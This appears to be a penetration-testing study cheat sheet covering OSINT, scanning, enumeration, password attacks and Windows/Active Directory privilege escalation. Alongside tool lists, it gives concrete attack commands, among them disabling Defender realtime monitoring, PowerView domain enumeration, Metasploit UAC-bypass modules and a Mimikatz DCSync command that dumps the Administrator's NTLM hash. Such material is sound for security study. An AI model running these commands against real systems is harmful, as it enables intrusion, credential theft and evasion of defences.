
# Footprinting and Reconnaissance (OSINT - Information Gathering)

- Online platforms: Social media, people search sites and services, job portals, blogs, forums, groups, articles, etc
- Source code–based repositories (internal servers, self-hosted, third-party hosting - GitHub, GitLab, SourceForge, BitBucket) contain sensitive data, configuration files, SSH, SSL keys, source-code files, dynamic libraries
- Web Services:
	- Advance Search using Search Engines, Image Searches, Reverse Search
	- FTP Search Engine (NAPALM FTP Indexer, FreewareWeb FTP File Search, Mamont, Globalfilesearch.com)
	- IoT Search Engines (Shodan, Censys, ZoomEye - manufacturer details, geographical location, IP address, hostname, open ports of IoT device)
	- Google Dorks (Advanced search operators/queries in Google Search Engine to find information - sites, links, files, open FTP ports, services)
	- www.exploit-db.com (Exploit-DB is online archive of exploits, security vulnerabilities, and proof-of-concept code)
	- www.exploit-db.com/google-hacking-database (GHDB - Google Hacking Database is collection of advanced search queries - Google Dorks)
	- archive.org (Digital Library & Internet Archive Wayback Machine that explores archived versions of websites)
	- www.social-searcher.com - Social Accounts
	- whois.domaintools.com - WHOIS
	- search.censys.io - Domains, Subdomains, Hosts, OS, Infrastructure, Technologies used by site
	- www.netcraft.com/tools
	- dnsdumpster.com
	- pentest-tools.com
	- www.ip2location.com - Email Footprinting, Email Header Tracer
	- mxtoolbox.com
	- socialcatfish.com
	- shodan.io : search engine designed to detect devices and networks with vulnerabilities (connected to internet)
	- web-check.xyz : All-in-one OSINT tool for analysing any website
	- osint.sh : All in one Information Gathering Tools
	- osintframework.com : Collections of OSINT frameworks focused on gathering information from free tools and resources
	- www.semrush.com - SEO, content marketing, competitor research, PPC and social media marketing
- Extract Meta-deta from files:
	- exiftool : ExifTool is used to read and write metadata in various file types, such as JPEG images
	- pdfinfo : Portable Document Format (PDF) document information extractor (poppler-utils)
- CLI Tools:
	- whois : get whois information/record for domain
	- host : use for DNS lookups and convert names to IP addresses and vice versa
	- dig : Domain Information Groper (dig) retrieves information about DNS name servers
	- traceroute : route packets trace to network host
	- ip : show / manipulate routing, network devices, interfaces and tunnels (replaces deprecated: ifconfig, route, arp)
	- arp : show / manipulate Address Resolution Protocol (ARP) cache
	- ifconfig : Interface Configuration (ifconfig) configures network interfaces (deprecated)
	- nslookup : Name Server Lookup (nsookup) queries DNS Servers interactively (deprecated)
	- netstat : print network connections, routing tables, interface statistics, masquerade connections, multicast memberships, etc. (deprecated)
	- route : show / manipulate the IP routing table (deprecated)
	- tcpdump : TCP dump is packet analyser tool used to capture and analyse packets and network traffic in real-time over network
	- photon : retrieve archived URLs of the target website from archive.org
	- theharvester : OSINT gathering tool (gathers names, emails, IPs, subdomains, and URLs by using multiple public resources)
	- sherlock - Search on social media accounts - personal info
	- whatweb : WhatWeb is a next-generation web scanner that identifies technologies used by websites
	- fierce : DNS reconnaissance tool locate non-contiguous IP space and hostnames against specified domains
	- dnsrecon : DNS (Domain Name System) reconnaissance tool
	- recon-ng : web reconnaissance framework used for penetration testing, vulnerability assessment
	- maltego : used to determine the relationships and real world links between people, groups of people, organizations, websites, Internet infrastructure, documents
	- FOCA : Fingerprinting Organizations with Collected Archives is a tool used mainly to find metadata and hidden information in the documents it scans
	- subfinder : subdomain discovery tool that helps attackers find valid subdomains for websites
	- sublist3r : fast subdomains enumeration tool for penetration testers
	- Recon-Dog : Reconnaissance Swiss Army Knife - uses APIs to collect information about the target system, including Censys, NS Lookup, Port Scan, CMS Detection, Whois Lookup, Honeypot Detection, Subdomain Finder, Reverse IP Lookup, and Technology Detection
	- BillCipher : Information gathering tools: DNS, Whois, GeoIP, Subnet, Port Scanner, Page Links, Zone Transfer, HTTP Header, Host Finder, IP Locator, Shared DNS, Robots.txt, Reverse IP, Email Finder, Subdomains, Admin Login, CloudFlare Bypass, Website Copier, Host Info
	- Wireshark : Wireshark is a network protocol analyzer that interactively captures and analyzes network traffic
AI Tools:
	- taranis.ai : advanced open source intelligence (OSINT) tool that leverages artificial intelligence to gather, analyze, and interpret publicly available data
	- ossinsight.io : OSS Insight uses AI to provide in-depth insights into the GitHub ecosystem, analyzing over 5 billion GitHub events
	- dorkgpt.com : AI-powered tool designed to assist Google Dorking, a technique used to find information that is not easily accessible through regular search queries
	- dorkgenius.com : AI-powered tool that automates Google Dorking and helps users generate advanced search queries to find specific information on the internet
	- googlewordsniper.eu : Google Word Sniper helps to refine search queries for more effective Google results. It identifies targeted keywords and phrases, making it easier to find specific information, hidden content, and niche data.
	- cylect.io : advanced AI-powered OSINT tool that integrates multiple databases into a user-friendly interface, providing a vast collection of resources for ethical hackers and enabling efficient and confident OSINT investigations
	- chatpdf.com : OSINT tool that leverages AI to analyze and extract information from PDF documents through a conversational interface
	- www.bardeen.ai : automation tool that can be used for OSINT by enabling users to streamline and automate data collection and analysis processes from various online sources
	- cobwebs.com : PenLink Cobwebs is an advanced AI-powered OSINT tool that specializes in gathering and analyzing data from various online sources. It offers comprehensive capabilities for collecting, processing, and visualizing information to support cybersecurity investigations.
	- exploreai.vercel.app : Explore AI is an AI-powered YouTube search engine that uses artificial intelligence to search for and extract information from YouTube videos, making it easier to access information for ethical hacking purposes.
	- app.anypicker.com : AnyPicker is a powerful visual web scraper and AI OSINT tool designed to extract data from websites without requiring coding skills.


--------------------------------------------------

# Network Scanning
Network scanning refers to a set of procedures used for identifying hosts, ports, and services in a network.

- nmap : Network Mapper scans networks to identify devices, open ports, services, and detect OS and service versions, automating network scanning
- hping3 : network tool used for security auditing and testing. It sends custom TCP/IP packets to hosts for tasks such as port scanning, firewall testing, network performance analysis, and DoS testing
- Metasploit : an open-source project that provides the infrastructure, content, and tools to perform penetration tests and extensive security auditing
- sx : command-line network scanner (github.com/v-byte-cpu/sx)
- Angry IP Scanner : Fast, lightweight tool for discovering devices on a network, scanning IPs, ports, and gathering host information (angryip.org)
- RustScan : Fast, modern port scanner designed to perform high-speed scanning of open ports on target machines (github.com/RustScan/RustScan)
- scanlogd : TCP port scan detection tool that detects and logs TCP port scans


# Paid Tools:
- MegaPing (magnetosoft.com)
- OpUtils (www.manageengine.com)
- SolarWinds Engineer’s Toolset (www.solarwinds.com/free-tools)
- NetScanTools Tools (www.netscantools.com/freeware.html)
- PRTG Network Monitor (www.paessler.com)
- Colasoft Ping Tool (www.colasoft.com)
- Advanced IP Scanner (www.advanced-ip-scanner.com)
- Splunk Enterprise Security (www.splunk.com)


--------------------------------------------------

# Enumeration
Enumeration is the process of extracting usernames, machine names, network resources, shares, and services from a system or network. In the enumeration phase, an attacker creates active connections with the system and sends directed queries to gain more information about the target.

- knockpy : Knock is a tool designed to quickly enumerate subdomains of a target domain through passive reconnaissance and dictionary scanning (passive)
- raccoon : Raccoon is a high-performance offensive security tool for reconnaissance and vulnerability scanning (active)
- subfinder : Fast passive subdomain enumeration tool that discovers valid subdomains using online passive sources (passive)
- turbolist3r : TurboList3r is a subdomain enumeration tool with automated analysis, focused on subdomain takeover

- nbtscan : Scan network for NetBIOS name information
- snmp-check : SNMP device enumerator
- snmpwalk : retrieve a subtree of management values using SNMP GETNEXT requests
- ldapsearch : LDAP search tool (ldapsearch ldap://<ip> -x)
- ntptrace : trace chain of NTP servers back to primary source
- rpcinfo : report RPC information - NFS (rpcinfo -p <ip>)
- showmount : show mount information for an NFS server (showmount -e <ip>)
- RPCScan : RPCScan communicates with RPC services and checks misconfigurations on NFS shares
- SuperEnum : SuperEnum includes a script that performs the basic enumeration of any open port
- DNS Zone Transfer with Dig:
	- dig ns <ip>
	- dig @<domain_name_server> <ip> axfr
- DNS Zone Transfer with DNSRecon: dnsrecon -t axfr -d <ip>
- DNS Cache Snooping:
	- Non-recursive method: dig @<dns_server_ip> <ip> A +norecurse
	- Recursive method: dig @<dns_server_ip> <ip> A +recurse
- DNSSEC Zone Walking:
	- LDNS: ldns-walk @<dns_server_ip> <ip>
	- DNSRecon: dnsrecon -z -d <ip>
- DNS Enumeration with OWASP Amass:
	- amass enum -d <ip>
	- Passive: amass enum -passive -d <ip>
	- Active enumeration through brute-forcing with specified wordlist: amass enum -active -d <ip> /usr/share/wordlists/amass/all.txt
- IPsec Enumeration - ISAKMP Port status: nmap –sU –p 500 <ip>
- ike-scan : Discover and fingerprint IKE (Internet Key Exchange) hosts (IPsec VPN servers)
- VoIP Enumeration with Session Initiation Protocol (SIP) protocol: svmap <ip>
- RPC Enumeration (Identify RPC service running):
	- nmap -sR <ip>
	- nmap -T4 –A <ip>
- SMB Enumeration (SMB service running):
	- nmap -p 445 -A <ip>
	- enum4linux : enumerate information from Windows and Samba systems


--------------------------------------------------

# Vulnerability Analysis/Assessment

# Vulnerability Classification:
- Misconfigurations/Weak Configurations
	- Network Misconfigurations
		- Insecure Protocols
		- Open Ports and Services
		- Errors
		- Weak Encryption
	- Host Misconfigurations
		- Open Permissions
		- Unsecured Root Accounts
- Application Flaws
	- Buffer Overflows
	- Memory Leaks (Valgrind)
	- Resource Exhaustion
	- Integer Overflows
	- Null Pointer/Object Dereference
	- DLL (Dynamic Link Library) Injection
	- Race Conditions
		- Time of Check/Time of Use
	- Improper Input Handling
	- Improper Error Handling
	- Code Signing Weakness
- Poor Patch Management
	- Unpatched Servers
	- Unpatched Firmware
	- Unpatched OS
	- Unpatched Applications
- Design Flaws
- Third-Party Risks
	- Vendor management
		- System integration
		- Lack of vendor support
	- Supply-chain risks
	- Outsourced code development
	- Data storage
	- Cloud-based vs. On-premises risks
- Default Installations/Default Configurations
- Operating System Flaws
- Default Passwords
- Zero-Day Vulnerabilities
- Legacy Platform Vulnerabilities
- System Sprawl/Undocumented Assets
- Improper Certificate and Key Management

# Types of Vulnerability Scanning:
- External Scanning
- Internal Scanning
- Host-based scanning
- Network-based Scanning
- Application Scanning
- Database Scanning
- Wireless Network Scanning
- Distributed Scanning
- Credentialed/Authenticated Scanning
- Non-Credentialed/Unauthenticated Scanning
- Manual Scanning
- Automated Scanning
- Cloud-based Scanning
- Mobile Application Scanning
- Physical Security Vulnerability Scanning
- IoT Device Vulnerability Scanning

# Vulnerability Assessment Solutions:
- Product-Based Solutions
- Service-Based Solutions
- Tree-Based Assessment
- Inference-Based Assessment

# Types of Vulnerability Assessment Tools:
- Host-Based Vulnerability Assessment Tools
- Depth Assessment Tools
- Application-Layer Vulnerability Assessment Tools
- Scope Assessment Tools
- Active and Passive Tools
- Location and Data Examination Tools
	- Network-Based Scanner
	- Agent-Based Scanner
	- Proxy Scanner
	- Cluster scanner

# Vulnerability Scoring Systems and Databases
- Common Vulnerability Scoring System (CVSS) - www.first.org
- MITRE Common Vulnerabilities and Exposures (CVE) - cve.mitre.org
- National Vulnerability Database (NVD) - nvd.nist.gov
- Common Weakness Enumeration (CWE) - cwe.mitre.org
- Exploit Database - www.exploit-db.com
- Vulnerability Database - vuldb.com
- Open Source Vulnerability Database - osv.dev

# Vulnerability Research Resources
- Microsoft Security Response Center (MSRC) - msrc.microsoft.com
- HackerStorm - www.hackerstorm.co.uk

# Vulnerability Assessment Tools
- nikto : Scan web server for known vulnerabilities
- skipfish : web application security scanner
- OpenVAS (www.openvas.org)
	- sudo docker run -d -p 443:443 --name openvas mikesplain/openvas
	- Launch OpenVAS: https://127.0.0.1 (Username: admin; Password: admin)
- Snort : Open Source Network Intrusion Prevention System (IPS)
- SmartScanner : AI-powered web vulnerability scanner that detects a wide range of threats, from SQL Injection and XSS to misconfigurations and cryptographic flaws. It supports various technologies, including REST APIs, modern frameworks, and popular CMS platforms, offering an intuitive interface and detailed reports. (www.thesmartscanner.com)


--------------------------------------------------

# Attack Tools
- nc : Netcat is a versatile networking tool for establishing arbitrary TCP and UDP connections, allowing reading from and writing to network connections
- gobuster : Gobuster is a Go-based tool for brute-forcing URIs, DNS subdomains, virtual hosts, and discovering open Amazon S3 buckets, Google Cloud buckets, and TFTP servers
- sqlmap : sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers

# Digital Forensics & Data Recovery:
- teskdsk : TestDisk is used to recover lost or damaged partitions and boot sectors
- photorec : PhotoRec is used to recover files from corrupted or formatted disks, or when the file system is damaged
- FTK : Forensic Toolkit is a forensic suite used for analyzing disk drives, memory, and emails


--------------------------------------------------

# System Hacking

## Gaining Access:

- Password Recovery/Cracking/Attacks Tools
	- Windows
		- pwdump7 : extracts LM and NTLM password hashes of local user accounts from the Security Account Manager (SAM) database
		- Rubeus : retrieve a TGT based on a user password/hash
		- Mimikatz : extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory, as well as perform pass-the-hash, pass-the-ticket, and create Golden Tickets
		- DSInternals : Directory Services Internals PowerShell Module and Framework
		- adfsbrute : script to test credentials against Active Directory Federation Services (ADFS), allowing password spraying or bruteforce attacks
		- CrackMapExec : CME is versatile post-exploitation and lateral movement tool designed for penetration testing in Active Directory environments
		- Impacket : Impacket is a collection of Python classes for working with network protocols
		- L0phtCrack : L0phtCrack is a tool designed to audit passwords and recover applications
		- Responder : LLMNR, NBT-NS and MDNS poisoner
		- brutus : brute-force password-cracking tool, primarily designed for older Windows systems
		- Vindicate : LLMNR/NBNS/mDNS Spoofing Detection Toolkit for network administrators
		- Respounder : detects presence of responder in the network
		- got-responded : detect LLMNR and NBT-NS spoofing
	- crunch : generates wordlists based on specified character sets, lengths, and patterns for use in dictionary attacks
	- CeWL : Custom Word List Generator generates custom wordlists by crawling websites and extracting words based on specified parameters
	- hashID : tool to identify different types of hashes
	- John the Ripper : advanced offline password cracker that supports hundreds of hash and cipher types
	- Hashcat : Password recovery utility
	- hashcat-utils : powerful and versatile password recovery utility supporting a wide range of hash algorithms
	- RainbowCrack : password-cracking tool that uses rainbow tables to recover plaintext passwords from their hashed values
	- Hydra : fast and flexible password-cracking tool used for brute-force and dictionary attacks against various network services and protocols
	- Patator : multi-purpose brute-forcer with modular design and flexible usage
	- Ncrack : high-speed network authentication cracking tool
	- PyCrack : Advanced password-cracking tool supporting brute force, dictionary, and random attacks, capable of cracking files and hashes (e.g. PDF, ZIP, MS Excel, MS Word, MS PowerPoint, MD5, SHA-224, SHA-256, etc.)
	- Aircrack-ng : complete suite of tools to assess WiFi network security
	- BruteX : automates brute-force attacks against all services running on target
	- Secure Shell Bruteforcer : SSB - faster & simpler way to bruteforce SSH server

- Password Recovery Tools (Windows)
	- Elcomsoft Distributed Password Recovery (www.elcomsoft.com)
	- Lazesoft Recover My Password (www.lazesoft.com)
	- Passper WinSenior (passper.imyfone.com)
	- Passware Kit Forensic (www.passware.com)
	- PCUnlocker (www.top-password.com)

- Default Passwords
	- 192-168-1-1ip.mobi
	- cirt.net
	- default-password.info
	- www.fortypoundhead.com
	- www.routerpasswords.com

- Password Attacks
	- Active Online (Windows)
		- Hash Injection/Pass-the-Hash (PtH) Attack : Technique where an attacker uses a stolen NTLM hash instead of the plaintext password to authenticate and gain access to systems or resources - Mimikatz and Impacket (psexec.py)
		- LLMNR/NBT-NS Poisoning : Network attack that exploits the LLMNR and NBT-NS protocols to capture authentication credentials (NTLM hashes) from target system - Responder
		- Internal Monologue Attack : Stealthy technique used to extract NTLM hashes from compromised Windows machine without generating network traffic - Invoke-InternalMonologue
		- Cracking Kerberos Password : Attack involves brute-forcing or dictionary attacks on the encrypted password hashes associated with Kerberos authentication tickets to reveal plaintext passwords
			- AS-REP Roasting (Cracking TGT): Extract user accounts hash that do not require preauthentication then crack encrypted TGT hash (JtR/Hashcat) - Impacket (GetNPUsers.py)
			- Kerberoasting (Cracking TGS): Attacker authenticates to the Kerberos network, obtains a TGT, requests TGS tickets for specific services encrypted with service account hashes, and extracts them using tools like Rubeus (gain access to higher-privileged service accounts)
		- Pass-the-Ticket Attack : Using a stolen Kerberos ticket (TGT or TGS) to authenticate to other services or systems without needing the user's password, allowing attackers to gain unauthorized access using the victim's ticket - Mimikatz, Rubeus, Windows Credentials Editor
		- NTLM Relay Attack : Network attack where an attacker intercepts and relays NTLM authentication traffic to authenticate as the victim on another system without cracking the credentials - Responder, Impacket (ntlmrelayx)
	- Passive Online
		- Wire Sniffing : Packet sniffing is a form of wire sniffing or wiretapping in which hackers sniff credentials during transit by capturing Internet packets - Wireshark, tcpdump
		- Man-in-the-Middle and Replay Attacks
	- Offline
		- Rainbow Table Attack : Password-cracking technique that uses precomputed hash-value pairs stored in a table to quickly match and reverse hash values into plaintext passwords, bypassing the need for real-time brute-forcing - RainbowCrack (rtgen)
		- Distributed Network Attack : Brute-force technique that uses multiple distributed systems to crack encrypted files or passwords by leveraging their combined computational power - Exterro Password Recovery Toolkit (PRTK)

- Vulnerability Exploitation Tools
	- WES-NG : Windows Exploit Suggester - Next Generation is python-based tool that analyzes the output of the Windows systeminfo utility to identify vulnerabilities affecting the system and corresponding exploits
	- Reverse Shell Generator : Online Reverse Shell generator with Local Storage functionality, URI & Base64 Encoding, MSFVenom Generator, and Raw Mode.
		- www.revshells.com
		- Local: docker run -d -p 80:80 reverse_shell_generator

- AI-Powered Vulnerability Exploitation Tools
	- Nebula : AI-Powered Ethical Hacking Assistant
	- DeepExploit : DeepExploit utilizes a deep learning model to automate vulnerability identification and exploitation

- Vulnerability Exploitation Attacks/Tools
	- Buffer Overflow
		- Types:
			- Stack Based Buffer Overflow (smaller, static buffers)
			- Heap Based Buffer Overflow (larger, dynamic buffers)
		- Windows Buffer Overflow Exploitation
			- Steps involved in exploiting Windows based buffer overflow vulnerability:
				- Perform spiking: with netcat
				- Perform fuzzing: Fuzzing sends data to cause a buffer overflow, overwriting the EIP and revealing its location to inject shellcode
				- Identify the offset: Attackers use Metasploit's pattern_create and pattern_offset tools to identify the offset and exact location where the EIP register is being overwritten
				- Overwrite the EIP register: Overwriting the EIP identifies whether a register can be controlled and overwritten with malicious shellcode
				- Identify bad characters: Before injecting the shellcode into the EIP register, attackers identify bad characters that may cause issues in the shellcode
				- Identify the right module: Identify the right module of a vulnerable server that lacks memory protection
				- Generate shellcode: Generate the shellcode (with the msfvenom command) and inject it into the EIP register to gain shell access to the target vulnerable server
				- Gain root access
		- Return-Oriented Programming (ROP) Attack
		- Bypassing ASLR (Address Space Layout randomization) and DEP (Data Execution Prevention) Security Mechanism
			- Heap Spraying - flooding free space of target process’s memory heap
			- JIT (Just-In-Time) Spraying - execute arbitrary code by exploiting vulnerabilities in JIT compilation (web browsers)
	- Exploit Chaining
	- Domain Mapping and Exploitation with Bloodhound
	- Post Active Directory (AD) Enumeration using PowerView
		- Note: Disable the security monitoring option: Set-MpPreference -DisableRealtimeMonitoring $true
		- Enumerating Domain Users:
			- Get-NetUser : Retrieves information related to the current domain user
			- Get-NetLoggedon -ComputerName <computer-name> : Retrieves information related to the current active domain users
			- Get-UserProperty –Properties pwdlastset : Retrieves the date and time of the password last set for each domain user
			- Find-LocalAdminAccess : Retrieves users having local administrative privileges in the current domain (requires administrator privileges)
			- Invoke-EnumerateLocalAdmin : Retrieves users having local administrative privileges in the network/domain (requires administrator privileges)
			- Get-NetSession -ComputerName <computer_name> : Retrieves information related to the current user logged into the machine
		- Enumerating Domains:
			- Get-ADDomain : Retrieves information related to the current domain including its domain controllers (DCs)
			- Get-NetDomain : Retrieves information related to the current domain including its network/domain controllers
			- Get-DomainSID : Retrieves the security ID (SID) of the current domain
		- Enumerating Domain Policy:
			- Get-DomainPolicy : Retrieves the policy used by the current domain
			- (Get-DomainPolicy)."SystemAccess" : Retrieves information related to the policy configurations of the domain’s system access
			- (Get-DomainPolicy)."kerberospolicy : Retrieves information related to the domain’s Kerberos policy
		- Enumerating Domain Controllers (DCs)
			- Get-NetDomainController : Retrieves information related to the current domain controller (DC)
		- Enumerating Domain Computers:
			- Get-NetComputer : Retrieves the list of all computers existing in the current domain
			- Get-NetComputer | select operatingsystem,dnshostname : Retrieves the list of all operating systems and DNS host names in the current domain
			- Get-NetComputer - OperatingSystem "*Server 2022*" : Retrieves all the domain computers running on Windows Server 2022
			- Get-NetComputer -Ping : Retrieves all the live hosts or pingable host systems available in the current domain
		- Enumerating Domain Groups :
			- Get-NetGroup : Retrieves the list of all groups existing in the current domain
			- Get-NetGroup -Domain <targetdomain> : Retrieves the list of all groups existing in the specified domain
			- Get-NetGroup 'Domain Administrators' : Retrieves all information related to the specified group
			- Get-NetGroup “*admin*” : Retrieves all the groups containing admin in the group name
			- Get-NetGroupMember - GroupName "Domain Admins" : Retrieves all the members in the specified group
			- Get-NetGroup -UserName <"username"> : Retrieves the group name of the specified domain user
			- Get-NetLocalGroup - ComputerName <computername> : Retrieves all the group names of the specified domain computer
			- Get-NetLoggedon - ComputerName <DomainName> : Retrieves all the active logged-in users of the specified domain (requires administrator privileges)
			- Get-LastLoggedOn - ComputerName <DomainName> : Retrieves the last-logged-in user of the specified domain
		- Enumerating Domain Shares:
			- Invoke-ShareFinder -Verbose : Retrieves shares on the hosts in the current domain
			- Get-NetShare : Retrieves all the network shares existing in the current domain
			- Get-NetFileServer -Verbose : Retrieves the file server of the current domain
			- Invoke-FileFinder : Retrieves all the files in the current domain including files that store credentials
			- Find-DomainShare : Retrieves the shares in the domain
		- Enumerating Group Policies and OUs:
			- Get-NetGPO Get-NetGPO| select displayname : Retrieves the list of all the GPOs present in the current domain
			- Get-NetOU : Retrieves all the OUs present in the current domain
		- Enumerating Access-Control Lists (ACLs):
			- Get-NetPGO | %(Get-ObjectAcl -ResolveGUIDs -Name $_.Name) : numerating Access-Control Lists
			- Get-ObjectAcl - SamAccountName "users" - ResolveGUIDs : Retrieves the details of the ACLs for a specific group (users)
			- Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs - Name $_.Name} : Retrieves the users who have modification rights for a group
			- Invoke-ACLScanner - ResolveGUIDs : Retrieves all information about ACEs
			- Get-PathAcl -Path \\Windows11\Users : Retrieves the ACL linked with a specific path (works only with the shared folder)
			- Get-Acl : Retrieves the security descriptions for a resource such as a file or registry key
		- Enumerating Domain Trust and Forests:
			- Get-NetForest : Retrieves the information of the current forestRetrieves the information of the current forest
			- Get-NetForest -Forest <forest> : Retrieves the information of the specified forest
			- Get-NetForestDomain : Retrieves all domains in the current forest
			- Get-NetForestCatalog : Retrieves the details of the global catalogs for the current forest
			- Get-NetForestCatalog - Forest <forest> : Retrieves the details of the global catalogs for the specified forest
	- linWinPwn : Bash script that integrates Active Directory tools for enumeration (LDAP, RPC, ADCS, MSSQL, Kerberos), vulnerability checks (noPac, ZeroLogon, MS17-010, MS14-068), object modifications (password change, group additions, RBCD, Shadow Credentials), and password dumping (secretsdump, lsassy, nanodump, DonPAPI)
	- GhostPack Seatbelt : Seatbelt performs a number of security-oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives (github.com/GhostPack/Seatbelt)
	- Buffer Overflow Detection Tools:
		- OllyDbg : OllyDbg is an assembler-level debugger for Microsoft Windows that dynamically traces stack frames and program execution, logging arguments of known functions
		- flawfinder : program that examines C/C++ source code and reports possible security weaknesses sorted by risk level
		- Splint : tool for statically checking C programs for security vulnerabilities and coding mistakes
		- Valgrind : An instrumentation framework for building dynamic analysis tools, Valgrind includes tools that can automatically detect memory management and threading bugs, as well as profile programs in detail (valgrind.org/info/tools.html)


## Privilege Escalation

- Types of Privilege Escalation
	- Horizontal Privilege Escalation (Same Level Privileges)
	- Vertical Privilege Escalation (Elevation of Privileges)
- Methods of Privilege Escalation
	- Privilege Escalation by Exploiting Vulnerabilities
	- Privilege Escalation Using DLL (Dynamic Link Library) Hijacking - Windows:
		- Spartacus : An automated DLL/COM hijacking toolkit that analyzes SysInternals Process Monitor logs to identify, exploit, and generate payloads for DLL and COM hijacking vulnerabilities
		- DLLirant : Tool to automatize the DLL Hijacking and DLL Proxying researches on a specified binary 
		- ImpulsiveDLLHijack : Automates the discovery and exploitation of DLL hijacking vulnerabilities in target binaries, with the hijacked paths identified later being weaponized during Red Team operations to evade EDR systems
		- PowerSploit : PowerShell Post-Exploitation Framework that is a collection of Microsoft PowerShell modules that aid penetration testers during all phases of an assessment
	- Privilege Escalation Using Dylib (dynamic library) Hijacking - MacOS:
		- Dylib Hijack Scanner : Scans a computer for applications that are either susceptible to dylib hijacking or have already been hijacked
	- Privilege Escalation Using Spectre and Meltdown Vulnerabilities:
		- Spectre and Meltdown are vulnerabilities found in the design of modern processor chips (AMD, ARM, and Intel). These vulnerabilities arise from performance and CPU optimizations in processors, such as branch prediction, out-of-order execution, caching, and speculative execution. Attackers can exploit these vulnerabilities to gain unauthorized access and steal sensitive system information, such as credentials and secret keys stored in the application's memory, to escalate privileges.
		- Spectre Vulnerability: Attackers can exploit this vulnerability to read adjacent memory locations of a process, accessing unauthorized information, and may even gain access to kernel memory or perform web-based attacks using JavaScript.
		- Meltdown Vulnerability: Attackers can exploit this vulnerability to escalate privileges by forcing an unprivileged process to read adjacent memory locations, such as kernel and physical memory, thereby revealing critical system information like credentials and private keys.
	- Privilege Escalation Using Named Pipe Impersonation - Windows:
		- In Windows OS, named pipes are used to facilitate legitimate communication between running processes.
		- In this technique, messages are exchanged between processes using a file. For example, if process A wants to send a message to process B, it writes the message to a file, and process B reads the message from that file.
	- Privilege Escalation by Exploiting Misconfigured Services - Windows:
		- Unquoted Service Paths: In Windows, services with unquoted executable paths can be exploited by attackers to elevate privileges when running under SYSTEM privileges.
		- Service Object Permissions: Misconfigured service permissions can allow attackers to modify or reconfigure service attributes, add users to the administrator group, and elevate privileges.
		- Unattended Installs: Unattended installation information, such as configuration settings used during the installation process, is stored in the Unattend.xml file and can be exploited by attackers to escalate privileges.
		- Modifiable Registry Autoruns and Configurations: Modifying certain registry entries that control the execution of programs, often exploiting weak or misconfigured permissions to gain higher privileges, execute malicious code, or persist on the system.
	- Pivoting and Relaying to Hack External Machines:
		- Pivoting and relaying are techniques used to gather detailed information about a target network after successfully compromising a target system. The compromised system acts as a bridge, enabling attackers to penetrate deeper into the target network and access other systems and resources that would otherwise be inaccessible from the attacking system.
		- Pivoting: Attackers use the pivoting technique to compromise a system, gain remote shell access on it, and further bypass the firewall to pivot via the compromised system to access other vulnerable systems in the network.
		- Relaying: Attackers use the relaying technique to access resources present on other systems via the compromised system in such a way that the requests to access the resources are coming from the initially compromised system.
	- Privilege Escalation Using Misconfigured NFS - Windows:
		- Attackers attempt to enumerate a misconfigured Network File System (NFS) to exploit it and gain root-level access to a remote server, as such misconfigurations allow them to escalate privileges from a regular or low-privileged user account.
	- Privilege Escalation by Bypassing User Account Control (UAC):
		- When attackers fail to escalate privileges with a simple payload, they attempt to evade Windows security features like UAC and exploit certain Windows applications to gain system-level access without triggering a UAC notification, even when UAC protection is enabled.
		- Techniques to Bypassing UAC Protection Using Metasploit:
			- Bypassing UAC Protection - exploit/windows/local/bypassuac
			- Through FodHelper Registry Key - exploit/windows/local/bypassuac_fodhelper
			- Through Eventvwr Registry Key - exploit/windows/local/bypassuac_eventvwr
			- Through COM Handler Hijacking - exploit/windows/local/bypassuac_comhijack
			- Via Memory Injection - exploit/windows/local/bypassuac_injection
	- Privilege Escalation by Abusing Boot or Logon Initialization Scripts:
		- Attackers exploit boot or logon initialization scripts to escalate privileges or maintain persistence on a target system. These scripts also enable attackers to perform various administrative tasks, allowing them to execute other programs on the system.
		- Windows Logon Script : Attackers establish persistence and escalate privileges on a system by embedding the path to their script in the registry key (HKEY_CURRENT_USER\Environment\UserInitMprLogonScript)
		- Mac Logon Script : In macOS, logon scripts are known as login hooks and allow attackers to establish persistence on a system, as they are executed automatically during system login. Attackers exploit these hooks to inject a malicious payload, elevate privileges, and maintain persistence.
		- Network Logon Scripts : Network logon scripts are assigned through Active Directory or GPOs. Attackers exploit these scripts to obtain local or administrator credentials, depending on the access configuration.
		- RC Scripts : Attackers exploit RC scripts by embedding a malicious binary, shell, or path in RC scripts such as rc.common or rc.local on Unix-based systems to escalate privileges and maintain persistence.
		- Startup Items : Attackers create malicious files or folders within the /Library/StartupItems directory to maintain persistence. Startup items are executed during bootup with root-level privileges.
	- Privilege Escalation by Modifying Domain Policy:
		- The domain policy consists of configuration settings that can be applied between domains in a forest environment. Attackers modify domain settings by altering group policies and trust relationships between domains. They may also deploy a fake domain controller to maintain a foothold and escalate privileges.
		- Group Policy Modification:
			- Group policies manage resources and configuration settings such as security options, registry keys, and domain members. By default, all user accounts have read access to GPOs, while write access is restricted to specific users or groups within the domain.
			- Attackers exploit the path <DOMAIN>\SYSVOL\<DOMAIN>\Policies\ to access and modify domain group policies, enabling activities like creating new accounts, disabling or modifying internal tools, transferring ingress tools, executing unwanted services, and extracting passwords in plaintext.
			- At <GPO_PATH>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml, attackers can modify the file to create a malicious scheduled task or job using scripts like New-GPOImmediateTask.
			- At <GPO_PATH>\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf, attackers may alter user rights (e.g., SeEnableDelegationPrivilege) to create a backdoor and then control the user account to modify group policy settings.
		- Domain Trust Modification:
			- Domain trust objects provide information such as credentials, accounts, and authentication and authorization mechanisms used by domains. C:\Windows\system32>nltest /domain_trusts
			- Attackers use this utility to gather information about trusted domains and leverage it to add a domain trust or modify existing trust settings, enabling privilege escalation through Kerberoasting and pass-the-ticket attacks.
	- Retrieving Password Hashes of Other Domain Controllers Using DCSync Attack:
		- A domain controller (DC) in a Windows environment securely validates user requests, manages user accounts, provides authentication, and enforces domain security policies. Directory replication ensures data consistency across DCs, so updates like password changes are reflected across all controllers.
		- The DCSync attack targets selective DCs. Attackers with privileged access and domain replication rights use replication protocols to create a virtual DC. This allows them to request and extract sensitive data, such as NTLM password hashes. With this information, attackers can perform golden ticket attacks, account manipulation, LOTL attacks, and deploy ransomware.
		- Attackers use Mimikatz to perform DCSync attacks. Mimikatz includes a DCSync command that employs the Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to mimic the behavior of a legitimate domain controller (DC).
		- Retrieve the NTLM password hashes of an administrator account: mimikatz “lsadump::dcsync /domain:(domain name) /user:Administrator”
